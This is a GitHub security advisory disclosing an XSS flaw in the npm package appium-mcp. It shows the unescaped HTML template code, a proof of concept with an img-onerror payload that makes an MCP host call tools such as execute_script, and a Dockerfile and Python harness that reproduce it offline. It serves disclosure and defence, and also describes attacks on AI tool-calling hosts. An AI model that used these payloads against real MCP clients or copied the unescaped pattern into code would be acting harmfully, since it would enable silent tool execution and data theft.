# [H] appium-mcp: Unescaped Locator Data XSS in MCP-UI Resource (createLocatorGeneratorUI)

## Summary
Severity: High
Advisory: GHSA-x975-rgx4-5fh4
CWE: CWE-79
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:H/A:N (CVSS_V3)
Published: 2026-06-19
Source: https://github.com/advisories/GHSA-x975-rgx4-5fh4
Type: github-advisory

## Affected
- npm: `appium-mcp` — affected >=0 <1.85.10

## Details
## Unescaped Locator Data XSS in MCP-UI Resource (createLocatorGeneratorUI)

### Summary

`appium-mcp`'s `createLocatorGeneratorUI` function interpolates attacker-controlled element attributes — `text`, `content-desc`, `resource-id`, and locator selector values — directly into an HTML template literal without any HTML or JavaScript context escaping. An attacker who controls the UI of the app under test can inject arbitrary HTML and JavaScript into the MCP UI resource returned by the `generate_locators` tool. When a victim's MCP client renders this resource, the injected script executes and can invoke arbitrary MCP tools via `window.parent.postMessage`, leading to unauthorized MCP tool execution such as taking screenshots, reading page source, or any other registered capability.

### Details

The vulnerability is a stored/reflected cross-site scripting (XSS) issue in the MCP UI generation pipeline.

**Vulnerable sink — `src/ui/mcp-ui-utils.ts:730–740`:**

```ts
${element.text ? `<p class="element-text"><strong>Text:</strong> ${element.text}</p>` : ''}
${element.contentDesc ? `<p class="element-text"><strong>Content Desc:</strong> ${element.contentDesc}</p>` : ''}
${element.resourceId ? `<p class="element-text"><strong>Resource ID:</strong> <code>${element.resourceId}</code></p>` : ''}
<code class="selector">${selector}</code>
<button class="test-btn" onclick="testLocator('${strategy}', `${selector.replace(/`/g, '\\`')}`)">Test</button>
```

None of `element.text`, `element.contentDesc`, `element.resourceId`, `selector`, or `strategy` are HTML-escaped before insertion. The `onclick` attribute additionally embeds `selector` and `strategy` into an inline JavaScript string using only a backtick-escape that is insufficient to prevent breakout via HTML event attribute syntax or single-quote injection.

By contrast, `createPageSourceInspectorUI` at `src/ui/mcp-ui-utils.ts:911–916` does apply escaping to the page source, confirming that the protection gap in `createLocatorGeneratorUI` is an oversight, not a design choice.

**Complete data flow (source → sink):**

1. `src/tools/test-generation/locators.ts:57` — `getPageSource(driver)` reads the page source XML from an active Appium session; the connected app is fully attacker-controlled.
2. `src/tools/test-generation/locators.ts:72` — the raw page source is passed to `generateAllElementLocators`.
3. `src/locators/source-parsing.ts:108` — XML attribute values undergo only newline replacement (`attr.value.replace(/(\n)/gm, '\n')`); HTML entities such as `&lt;` are decoded into raw `<` characters by the XML parser with no re-encoding.
4. `src/locators/generate-all-locators.ts:73–75` — `element.attributes.text`, `['content-desc']`, and `['resource-id']` are copied verbatim into the locator result object.
5. `src/tools/test-generation/locators.ts:90` — the locator objects are passed to `createLocatorGeneratorUI`.
6. `src/ui/mcp-ui-utils.ts:730–740` — values are interpolated directly into the HTML response (sink).

The `window.parent.postMessage({type:'tool', payload:{toolName:...}}, '*')` mechanism used throughout `src/ui/mcp-ui-utils.ts:645–695` means any JavaScript executing in the rendered UI resource can invoke registered MCP tools unconditionally.

**Remediation** requires an HTML-escaping helper (replacing `&`, `<`, `>`, `"`, `'`) applied to all element properties in the HTML context, and `JSON.stringify` for values embedded inside JavaScript string literals in `onclick` handlers.

### PoC

**Prerequisites:**
- `appium-mcp` v1.85.8 or v1.85.9 installed from npm
- Node.js 20+ with the package built (`npm install && npm run build`)
- An MCP client that renders HTML resources returned by `generate_locators` (e.g., VS Code with the Appium MCP extension, or any WebView-based MCP host)

**Static confirmation (no Appium session required):**

```bash
node --input-type=module <<'EOF'
import { generateAllElementLocators } from './dist/locators/generate-all-locators.js';
import { createLocatorGeneratorUI }   from './dist/ui/mcp-ui-utils.js';

const xml = `<hierarchy>
  <node class="android.widget.TextView"
        clickable="true"
        enabled="true"
        displayed="true"
        text="&lt;img src=x onerror=&quot;window.parent.postMessage({type:'tool',payload:{toolName:'appium_screenshot',params:{}},'*')&quot;&gt;"
        content-desc="&lt;b&gt;xss-in-contentDesc&lt;/b&gt;"
        resource-id="com.attacker.app/&lt;u&gt;xss-resource-id&lt;/u&gt;"/>
</hierarchy>`;

const locators = generateAllElementLocators(xml, true, 'uiautomator2', { fetchableOnly: true });
const html     = createLocatorGeneratorUI(locators);

console.log('UNESCAPED <img src=x onerror= present:', html.includes('<img src=x onerror='));
console.log('UNESCAPED <b> in contentDesc present:  ', html.includes('<b>xss-in-contentDesc</b>'));
console.log('UNESCAPED <u> in resourceId present:   ', html.includes('<u>xss-resource-id</u>'));
EOF
```

**Expected output:**
```
UNESCAPED <img src=x onerror= present: true
UNESCAPED <b> in contentDesc present:   true
UNESCAPED <u> in resourceId present:    true
```

**Dynamic confirmation (Docker, network-isolated):**

```bash
# Build context is the parent directory (contains repo/ and vuln-001/)
docker build -t appium-mcp-vuln-001 \
  -f vuln-001/Dockerfile \
  reports/npmAI_303_appium__appium-mcp

docker run --rm --network none appium-mcp-vuln-001
```

The container output confirms:
```
HTML has unescaped <img src=x onerror= : true
Text paragraph  : <p class="element-text"><strong>Text:</strong> <img src=x onerror="window.parent.postMessage(...)"></p>
│  [PASS] XSS CONFIRMED                                       │
│  createLocatorGeneratorUI inserted the raw <img> XSS tag   │
│  execute the onerror handler, enabling arbitrary MCP tool   │
```

**End-to-end exploitation against a real MCP client:**

1. Attacker publishes or sideloads an Android/iOS app whose UI element `text`, `content-desc`, or `resource-id` attributes contain an XSS payload (e.g., `<img src=x onerror="window.parent.postMessage({type:'tool',payload:{toolName:'execute_script',params:{script:'fetch(...)'}},'*')">`).
2. Victim developer connects their Appium MCP server to the attacker's app and calls the `generate_locators` MCP tool.
3. The MCP client renders the returned HTML resource in a WebView / iframe.
4. The injected `onerror` handler fires and posts a crafted `tool` message to the parent frame, causing the MCP host to invoke arbitrary registered tools (e.g., `appium_screenshot`, `execute_script`, `get_page_source`) without user confirmation.

### Impact

This is a **Cross-Site Scripting (XSS)** vulnerability. Any developer using `appium-mcp` with an MCP client that renders HTML resources (the intended workflow for the UI feature) is impacted when they inspect elements from an attacker-controlled application.

**Impact scenarios:**
- **Arbitrary MCP tool invocation:** Injected JavaScript calls `window.parent.postMessage` with any tool name and parameters, executing MCP tools silently (e.g., taking screenshots, reading page source, executing scripts on the device).
- **Credential and data exfiltration:** Via `execute_script` or screenshot tools, an attacker can extract sensitive data visible on the device screen or in the page source.
- **Lateral movement / persistence:** If the MCP host exposes file-system or shell tools, the attacker can escalate to arbitrary code execution on the developer's machine.
- **Supply-chain / CI abuse:** Automated test pipelines that call `generate_locators` against third-party app builds are equally vulnerable; no human interaction beyond running the pipeline is required.

The attack requires no authentication (`PR:N`), the tool is enabled by default (`default-on: Y`), and the scope is changed (`S:C`) because JavaScript executes in the MCP host frame rather than the sandboxed resource.

### Reproduction artifacts

#### `Dockerfile`

```dockerfile
# VULN-001 PoC: Unescaped Locator Data XSS in appium-mcp createLocatorGeneratorUI
#
# Build context: reports/npmAI_303_appium__appium-mcp/
# (parent directory containing both repo/ and vuln-001/)
#
# Build:  docker build -t appium-mcp-vuln-001 -f vuln-001/Dockerfile .
# Run:    docker run --rm --network none appium-mcp-vuln-001

FROM node:20

WORKDIR /app

# Copy the vulnerable appium-mcp source tree
COPY repo/ ./

# Install all dependencies.
# --ignore-scripts skips postinstall hooks (native node-gyp builds) that
# are irrelevant for the TypeScript compilation we need.
# --no-audit / --no-fund suppress network noise.
RUN npm install --ignore-scripts --no-audit --no-fund 2>&1

# Compile TypeScript -> JavaScript (dist/)
RUN npm run build

# Copy the PoC exploit script into the built app directory
COPY vuln-001/exploit.mjs ./exploit.mjs

# Default: run the XSS exploit proof-of-concept
ENTRYPOINT ["node", "exploit.mjs"]
```

#### `poc.py`

```python
#!/usr/bin/env python3
"""
VULN-001 Dynamic PoC: Unescaped Locator Data XSS in appium-mcp createLocatorGeneratorUI

This script:
  1. Builds a Docker image containing the vulnerable appium-mcp source.
  2. Runs exploit.mjs inside the container with --network none (no outbound traffic).
  3. Parses the output to confirm the XSS payload survived unescaped into the HTML.
  4. Writes phase2_result.json with PASS/FAIL verdict and evidence.

Safety constraints:
  - Uses local Docker only (no external services).
  - Network is disabled in the container (--network none).
  - No live Appium session, no real device, no real credentials.
  - The repo source is not modified; the vulnerability is in the original code.
"""

import json
import os
import subprocess
import sys

# ── Paths ─────────────────────────────────────────────────────────────────────
VULN_DIR    = os.path.dirname(os.path.abspath(__file__))
CONTEXT_DIR = os.path.dirname(VULN_DIR)   # parent: npmAI_303_appium__appium-mcp/
DOCKERFILE  = os.path.join(VULN_DIR, "Dockerfile")
RESULT_PATH = os.path.join(VULN_DIR, "phase2_result.json")

IMAGE_NAME  = "appium-mcp-vuln-001"

BUILD_CMD = (
    f"docker build -t {IMAGE_NAME} "
    f"-f vuln-001/Dockerfile "
    f"{CONTEXT_DIR}"
)
RUN_CMD = f"docker run --rm --network none {IMAGE_NAME}"
POC_CMD = f"python3 {os.path.basename(__file__)}"


def run(cmd: list[str], timeout: int = 600) -> tuple[int, str, str]:
    """Run a subprocess and return (returncode, stdout, stderr)."""
    result = subprocess.run(
        cmd,
        capture_output=True,
        text=True,
        timeout=timeout,
    )
    return result.returncode, result.stdout, result.stderr


def build_image() -> tuple[bool, str]:
    """Build the Docker image. Returns (success, error_message)."""
    print("[*] Building Docker image (this may take several minutes for npm install)...")
    print(f"    {BUILD_CMD}\n")
    rc, stdout, stderr = run(
        ["docker", "build", "-t", IMAGE_NAME, "-f", DOCKERFILE, CONTEXT_DIR],
        timeout=600,
    )
    if rc != 0:
        tail = (stdout + stderr)[-3000:]
        print(f"[!] Build FAILED (exit {rc}):\n{tail}")
        return False, tail
    print("[*] Build succeeded.")
    return True, ""


def run_exploit() -> tuple[int, str, str]:
    """Run the exploit container. Returns (returncode, stdout, stderr)."""
    print(f"\n[*] Running exploit container...")
    print(f"    {RUN_CMD}\n")
    rc, stdout, stderr = run(
        ["docker", "run", "--rm", "--network", "none", IMAGE_NAME],
        timeout=120,
    )
    print("--- container stdout ---")
    print(stdout)
    if stderr.strip():
        print("--- container stderr ---")
        print(stderr)
    return rc, stdout, stderr


def extract_evidence(stdout: str) -> str:
    """Pull the most relevant lines from exploit output."""
    evidence_lines = []
    for line in stdout.splitlines():
        upper = line.upper()
        if any(kw in upper for kw in [
            "PASS", "FAIL", "CONFIRMED", "EVIDENCE",
            "UNESCAPED", "IMG SRC", "ONERROR",
            "TEXT PARAGRAPH", "CONTENTDESC", "RESOURCEID",
            "XSS",
        ]):
            evidence_lines.append(line)
    return "\n".join(evidence_lines) if evidence_lines else stdout[:2000]


def write_result(payload: dict) -> None:
    with open(RESULT_PATH, "w", encoding="utf-8") as fh:
        json.dump(payload, fh, indent=2, ensure_ascii=False)
    print(f"\n[*] Result written to: {RESULT_PATH}")


def main() -> None:
    # ── Build ──────────────────────────────────────────────────────────────────
    build_ok, build_err = build_image()
    if not build_ok:
        write_result({
            "passed": False,
            "verdict": "FAIL",
            "reason": (
                "Docker 이미지 빌드 실패. npm install 또는 TypeScript 컴파일 오류가 발생함. "
                "오류 메시지를 확인하여 누락된 패키지나 호환성 문제를 해결한 뒤 재시도 필요."
            ),
            "build_command": BUILD_CMD,
            "run_command": RUN_CMD,
            "poc_command": POC_CMD,
            "evidence": f"Build error (last 2000 chars):\n{build_err[-2000:]}",
            "artifacts": ["Dockerfile", "poc.py"],
        })
        sys.exit(1)

    # ── Run ────────────────────────────────────────────────────────────────────
    exit_code, stdout, stderr = run_exploit()

    # ── Verdict ────────────────────────────────────────────────────────────────
    xss_confirmed = (exit_code == 0) and ("XSS CONFIRMED" in stdout)
    evidence = extract_evidence(stdout)

    if xss_confirmed:
        write_result({
            "passed": True,
            "verdict": "PASS",
            "reason": (
                "컨테이너 내부에서 실제 실행을 통해 XSS 취약점이 확인됨. "
                "generateAllElementLocators()가 XML 속성의 &lt;img&gt; 엔티티를 "
                "원시 HTML 태그 <img src=x onerror=...>로 디코딩하고, "
                "createLocatorGeneratorUI()가 이를 HTML 이스케이프 없이 그대로 삽입함. "
                "MCP UI 렌더러(iframe/WebView)에서 해당 HTML을 렌더링하면 onerror 핸들러가 실행되어 "
                "window.parent.postMessage()를 통해 임의 MCP 도구를 호출할 수 있음."
            ),
            "build_command": BUILD_CMD,
            "run_command": RUN_CMD,
            "poc_command": POC_CMD,
            "evidence": evidence,
            "artifacts": ["Dockerfile", "poc.py"],
        })
        print("[PASS] XSS exploit confirmed.")
        sys.exit(0)
    else:
        reason_detail = (
            f"컨테이너 종료 코드: {exit_code}. "
            "'XSS CONFIRMED' 문자열이 출력에 없음. "
            "exploit.mjs 또는 Dockerfile을 확인하고 재시도 필요."
        )
        write_result({
            "passed": False,
            "verdict": "FAIL",
            "reason": reason_detail,
            "build_command": BUILD_CMD,
            "run_command": RUN_CMD,
            "poc_command": POC_CMD,
            "evidence": (stdout + "\n" + stderr)[:3000],
            "artifacts": ["Dockerfile", "poc.py"],
        })
        print(f"[FAIL] Exploit did not produce expected output (exit_code={exit_code}).")
        sys.exit(1)


if __name__ == "__main__":
    main()
```

## References
- https://github.com/appium/appium-mcp/security/advisories/GHSA-x975-rgx4-5fh4
- https://github.com/appium/appium-mcp/commit/e222bbbd6fe2b656a320efcd143563f08061a83d
- https://github.com/appium/appium-mcp
- https://github.com/appium/appium-mcp/releases/tag/v1.85.10
